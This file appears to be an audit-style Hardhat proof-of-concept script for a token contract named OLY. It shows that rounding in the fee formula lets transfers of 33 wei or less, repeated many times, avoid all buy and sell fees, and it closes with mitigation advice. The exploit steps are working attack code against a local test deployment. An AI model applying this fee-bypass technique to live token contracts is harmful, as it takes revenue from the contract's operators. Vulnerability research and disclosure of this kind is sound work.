/**
 * CVE-OLY-008: Precision-Based Fee Bypass Exploit
 * 
 * MAJOR VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how small transfer amounts can bypass fees
 * due to integer division rounding, enabling systematic fee avoidance
 * through micro-transactions.
 * 
 * âš ï¸ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("ğŸŸ  CVE-OLY-008: Precision-Based Fee Bypass Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, normalUser, mainPair] = await ethers.getSigners();
    
    console.log("ğŸ‘¤ Deployer:", deployer.address);
    console.log("ğŸ´â€â˜ ï¸ Attacker:", attacker.address);
    console.log("ğŸ‘¤ Normal User:", normalUser.address);
    console.log("ğŸª Main Pair:", mainPair.address);
    console.log("");

    // Step 1: Deploy mock fee receiver
    console.log("ğŸ“‹ Step 1: Deploying Mock Fee Receiver...");
    
    const MockFeeReceiver = await ethers.getContractFactory("MockFeeReceiver");
    const mockReceiver = await MockFeeReceiver.deploy();
    await mockReceiver.waitForDeployment();
    
    console.log("ğŸ“¡ Mock Fee Receiver deployed at:", await mockReceiver.getAddress());

    // Step 2: Deploy OLY contract
    console.log("\nğŸ“‹ Step 2: Deploying OLY Contract...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await mockReceiver.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("ğŸª™ OLY Contract deployed at:", await oly.getAddress());
    
    const buyFeeRatio = await oly.buyFeeRatio();
    const sellFeeRatio = await oly.feeRatio();
    const precision = await oly.PRECISION();
    
    console.log("ğŸ’¸ Buy Fee Ratio:", buyFeeRatio.toString(), "(3%)");
    console.log("ğŸ’¸ Sell Fee Ratio:", sellFeeRatio.toString(), "(3%)");
    console.log("ğŸ¯ Precision:", precision.toString());

    // Step 3: Setup contract state
    console.log("\nğŸ“‹ Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("1000000", 9); // Large amount for testing
    await oly.mint(attacker.address, mintAmount);
    await oly.mint(normalUser.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("âœ… Main pair set to:", mainPair.address);
    console.log("âœ… Tokens minted for testing");

    // Step 4: Analyze fee calculation precision
    console.log("\nğŸ“‹ Step 4: Analyzing Fee Calculation Precision...");
    
    console.log("ğŸ§® Fee Calculation Formula: fee = amount * feeRatio / PRECISION");
    console.log("ğŸ§® Buy Fee: fee = amount * 3000 / 100000");
    console.log("ğŸ§® Sell Fee: fee = amount * 3000 / 100000");
    console.log("");
    
    // Find the threshold where fees become 0 due to rounding
    console.log("ğŸ” Finding precision bypass threshold...");
    
    let bypassThreshold = 0n;
    for (let amount = 1n; amount <= 100n; amount++) {
        const calculatedFee = amount * 3000n / 100000n;
        if (calculatedFee === 0n) {
            bypassThreshold = amount;
            console.log(`   Amount ${amount}: Fee = ${calculatedFee} (BYPASS!)`);
        } else {
            console.log(`   Amount ${amount}: Fee = ${calculatedFee}`);
            break;
        }
    }
    
    console.log("ğŸ¯ Bypass threshold found:", bypassThreshold.toString(), "wei");
    console.log("ğŸ’€ Any amount â‰¤", bypassThreshold.toString(), "wei will pay 0 fees");

    // Step 5: Demonstrate normal fee collection
    console.log("\nğŸ“‹ Step 5: Demonstrating Normal Fee Collection...");
    
    const normalAmount = ethers.parseUnits("1000", 9);
    const expectedNormalFee = normalAmount * 3000n / 100000n;
    
    console.log("ğŸ’° Normal transfer amount:", ethers.formatUnits(normalAmount, 9));
    console.log("ğŸ§® Expected fee:", ethers.formatUnits(expectedNormalFee, 9));
    
    const initialFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const initialNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    // Normal user buy transaction
    await oly.connect(mainPair).transfer(normalUser.address, normalAmount);
    
    const afterNormalFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    const normalFeeCollected = afterNormalFeeBalance - initialFeeBalance;
    const normalUserReceived = afterNormalUserBalance - initialNormalUserBalance;
    
    console.log("ğŸ’¸ Actual fee collected:", ethers.formatUnits(normalFeeCollected, 9));
    console.log("ğŸ’° User received:", ethers.formatUnits(normalUserReceived, 9));
    console.log("âœ… Normal fee collection working as expected");

    // Step 6: Execute precision bypass exploit
    console.log("\nğŸ“‹ Step 6: Executing Precision Bypass Exploit...");
    
    // Calculate optimal micro-transaction size
    const targetTransferAmount = ethers.parseUnits("1000", 9); // Same as normal transfer
    const microAmount = bypassThreshold; // Use maximum amount that pays 0 fees
    const numberOfMicroTransactions = targetTransferAmount / microAmount;
    
    console.log("ğŸ¯ Target total transfer:", ethers.formatUnits(targetTransferAmount, 9));
    console.log("ğŸ”¬ Micro-transaction size:", microAmount.toString(), "wei");
    console.log("ğŸ”¢ Number of micro-transactions needed:", numberOfMicroTransactions.toString());
    
    if (numberOfMicroTransactions > 1000n) {
        console.log("âš ï¸ Too many transactions needed, using smaller target for demo");
        // Use smaller target for practical demonstration
        const demoTarget = ethers.parseUnits("100", 9);
        const demoMicroTransactions = demoTarget / microAmount;
        console.log("ğŸ¯ Demo target:", ethers.formatUnits(demoTarget, 9));
        console.log("ğŸ”¢ Demo micro-transactions:", demoMicroTransactions.toString());
    }
    
    // Execute micro-transaction attack
    console.log("\nğŸš€ Executing micro-transaction attack...");
    
    const attackStartFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const attackStartAttackerBalance = await oly.balanceOf(attacker.address);
    
    const microTransactionCount = 50n; // Practical number for demonstration
    const totalMicroAmount = microAmount * microTransactionCount;
    
    console.log("ğŸ”¬ Executing", microTransactionCount.toString(), "micro-transactions...");
    console.log("ğŸ’° Total amount to transfer:", totalMicroAmount.toString(), "wei");
    console.log("ğŸ§® Expected total fees if normal:", ethers.formatUnits((totalMicroAmount * 3000n / 100000n), 9));
    
    // Execute multiple micro-transactions
    for (let i = 0n; i < microTransactionCount; i++) {
        await oly.connect(mainPair).transfer(attacker.address, microAmount);
        
        if (i % 10n === 0n) {
            console.log(`   Completed ${i + 1n}/${microTransactionCount} micro-transactions`);
        }
    }
    
    const attackEndFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const attackEndAttackerBalance = await oly.balanceOf(attacker.address);
    
    const microAttackFeesCollected = attackEndFeeBalance - attackStartFeeBalance;
    const attackerMicroReceived = attackEndAttackerBalance - attackStartAttackerBalance;
    
    console.log("\nğŸ“Š Micro-transaction Attack Results:");
    console.log("ğŸ’¸ Total fees collected:", ethers.formatUnits(microAttackFeesCollected, 9));
    console.log("ğŸ’° Attacker received:", attackerMicroReceived.toString(), "wei");
    console.log("ğŸ¯ Total transferred:", totalMicroAmount.toString(), "wei");
    
    if (microAttackFeesCollected === 0n) {
        console.log("ğŸš¨ PRECISION BYPASS SUCCESSFUL: Zero fees collected!");
    }
    
    if (attackerMicroReceived === totalMicroAmount) {
        console.log("ğŸš¨ FULL AMOUNT RECEIVED: 100% of transfer amount received!");
    }

    // Step 7: Compare with equivalent normal transaction
    console.log("\nğŸ“‹ Step 7: Comparing with Equivalent Normal Transaction...");
    
    const equivalentNormalAmount = totalMicroAmount;
    const expectedEquivalentFee = equivalentNormalAmount * 3000n / 100000n;
    
    console.log("ğŸ”„ Executing equivalent normal transaction...");
    console.log("ğŸ’° Amount:", equivalentNormalAmount.toString(), "wei");
    console.log("ğŸ§® Expected fee:", expectedEquivalentFee.toString(), "wei");
    
    const beforeEquivalentFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    
    try {
        await oly.connect(mainPair).transfer(normalUser.address, equivalentNormalAmount);
        
        const afterEquivalentFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        const equivalentFeeCollected = afterEquivalentFeeBalance - beforeEquivalentFeeBalance;
        
        console.log("ğŸ’¸ Actual fee from normal transaction:", equivalentFeeCollected.toString(), "wei");
        
        const feeDifference = equivalentFeeCollected - microAttackFeesCollected;
        console.log("ğŸ“Š Fee difference (normal vs micro-attack):", feeDifference.toString(), "wei");
        
        if (feeDifference > 0n) {
            console.log("ğŸš¨ FEE AVOIDANCE CONFIRMED: Micro-transactions avoided", feeDifference.toString(), "wei in fees");
        }
        
    } catch (error) {
        console.log("âŒ Equivalent normal transaction failed:", error.message);
        console.log("ğŸ’¡ This might indicate the amount is too small for normal processing");
    }

    // Step 8: Scale up the attack
    console.log("\nğŸ“‹ Step 8: Scaling Up the Attack...");
    
    console.log("ğŸš€ Demonstrating large-scale precision bypass...");
    
    // Use larger micro-transactions that still bypass fees
    const largerBypassAmount = 33n; // 33 wei should still result in 0 fee with 3% ratio
    const largerBypassFee = largerBypassAmount * 3000n / 100000n;
    
    console.log("ğŸ”¬ Testing larger bypass amount:", largerBypassAmount.toString(), "wei");
    console.log("ğŸ§® Calculated fee:", largerBypassFee.toString(), "wei");
    
    if (largerBypassFee === 0n) {
        console.log("âœ… Larger amount still bypasses fees");
        
        const scaledAttackCount = 1000n;
        const scaledTotalAmount = largerBypassAmount * scaledAttackCount;
        const scaledExpectedFee = scaledTotalAmount * 3000n / 100000n;
        
        console.log("ğŸ“ˆ Scaled attack simulation:");
        console.log("   â€¢ Micro-transactions:", scaledAttackCount.toString());
        console.log("   â€¢ Total amount:", ethers.formatUnits(scaledTotalAmount, 9));
        console.log("   â€¢ Fees avoided:", ethers.formatUnits(scaledExpectedFee, 9));
        console.log("   â€¢ Revenue loss: 100%");
        
    } else {
        console.log("âŒ Larger amount would incur fees");
    }

    // Step 9: Test sell transactions
    console.log("\nğŸ“‹ Step 9: Testing Sell Transaction Precision Bypass...");
    
    console.log("ğŸ’° Testing precision bypass on sell transactions...");
    
    const sellBypassAmount = bypassThreshold;
    const sellBypassCount = 30n;
    const totalSellBypassAmount = sellBypassAmount * sellBypassCount;
    
    const beforeSellBypassFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellBypassMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("ğŸ”¬ Executing", sellBypassCount.toString(), "micro sell transactions...");
    
    for (let i = 0n; i < sellBypassCount; i++) {
        await oly.connect(attacker).transfer(mainPair.address, sellBypassAmount);
    }
    
    const afterSellBypassFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellBypassMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const sellBypassFeesCollected = afterSellBypassFeeBalance - beforeSellBypassFeeBalance;
    const mainPairSellReceived = afterSellBypassMainPairBalance - beforeSellBypassMainPairBalance;
    
    console.log("ğŸ’¸ Sell fees collected:", sellBypassFeesCollected.toString(), "wei");
    console.log("ğŸª Main pair received:", mainPairSellReceived.toString(), "wei");
    console.log("ğŸ¯ Total sell amount:", totalSellBypassAmount.toString(), "wei");
    
    if (sellBypassFeesCollected === 0n) {
        console.log("ğŸš¨ SELL FEE BYPASS CONFIRMED: Zero sell fees collected!");
    }

    // Step 10: Impact Assessment
    console.log("\nğŸ“‹ Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    const totalFeesAvoided = microAttackFeesCollected + sellBypassFeesCollected;
    const totalAmountTransferred = totalMicroAmount + totalSellBypassAmount;
    const expectedTotalFees = (totalMicroAmount * 3000n / 100000n) + (totalSellBypassAmount * 3000n / 100000n);
    
    console.log("ğŸ” VULNERABILITY ANALYSIS:");
    console.log("   â€¢ Integer division rounds down to zero for small amounts");
    console.log("   â€¢ No minimum fee threshold implemented");
    console.log("   â€¢ Systematic exploitation through micro-transactions");
    console.log("   â€¢ Affects both buy and sell operations");
    console.log("");
    
    console.log("ğŸ’° FINANCIAL IMPACT:");
    console.log("   â€¢ Total amount transferred:", totalAmountTransferred.toString(), "wei");
    console.log("   â€¢ Expected fees:", ethers.formatUnits(expectedTotalFees, 9));
    console.log("   â€¢ Actual fees collected:", ethers.formatUnits(totalFeesAvoided, 9));
    console.log("   â€¢ Revenue loss:", ethers.formatUnits(expectedTotalFees - totalFeesAvoided, 9));
    console.log("   â€¢ Loss percentage: ~100% for micro-transactions");
    console.log("");
    
    console.log("ğŸ›¡ï¸ MITIGATION REQUIRED:");
    console.log("   â€¢ Implement minimum fee threshold (e.g., 1 wei minimum)");
    console.log("   â€¢ Add minimum transfer amount limits");
    console.log("   â€¢ Use higher precision arithmetic");
    console.log("   â€¢ Consider fee calculation rounding up instead of down");
    console.log("   â€¢ Implement rate limiting for micro-transactions");

    console.log("\nğŸŸ  PRECISION BYPASS EXPLOIT COMPLETED");
    console.log("âš ï¸ This demonstrates systematic fee avoidance vulnerability");
}

// Mock Fee Receiver Contract Source
const mockFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockFeeReceiver {
    event SwapTriggered();
    
    function triggerSwapFeeForLottery() external {
        emit SwapTriggered();
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    mockFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("ğŸ’¥ Exploit failed:", error);
            process.exit(1);
        });
}